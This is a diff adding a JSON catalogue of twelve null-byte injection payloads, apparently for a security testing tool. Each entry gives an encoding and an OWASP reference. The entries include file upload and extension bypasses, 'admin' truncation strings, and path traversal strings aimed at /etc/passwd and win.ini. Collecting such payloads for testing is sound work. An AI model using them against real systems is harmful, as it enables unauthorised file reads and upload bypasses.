@@ -1,0 +1,74 @@
+[
+  {
+    "id": "null-001", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": "%00", "context": "string",
+    "description": "Null Byte - Basic URL encoded",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "null-002", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": "\\x00", "context": "string",
+    "description": "Null Byte - Hex encoded",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "null-003", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": "\\u0000", "context": "string",
+    "description": "Null Byte - Unicode encoded",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "null-004", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": "%00.jpg", "context": "string",
+    "description": "Null Byte - File extension bypass (jpg)",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "null-005", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": "%00.txt", "context": "string",
+    "description": "Null Byte - File extension bypass (txt)",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "null-006", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": ".php%00.jpg", "context": "string",
+    "description": "Null Byte - File upload bypass",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {"php": true}
+  },
+  {
+    "id": "null-007", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": "admin%00", "context": "string",
+    "description": "Null Byte - String truncation (admin)",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "null-008", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": "admin\\x00", "context": "string",
+    "description": "Null Byte - String truncation hex (admin)",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "null-009", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": "../../../../../etc/passwd%00", "context": "string",
+    "description": "Null Byte - Path traversal with null byte",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "null-010", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": "..\\..\\..\\..\\..\\windows\\win.ini%00", "context": "string",
+    "description": "Null Byte - Path traversal Windows with null byte",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {"windows": true}
+  },
+  {
+    "id": "null-011", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": "%00/", "context": "string",
+    "description": "Null Byte - Followed by slash",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "null-012", "family": "null_byte", "subtype": "null_byte",
+    "payload_string": "%2500", "context": "string",
+    "description": "Null Byte - Double URL encoded",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Null_Byte_Injection"], "platform_specific": {}
+  }
+]
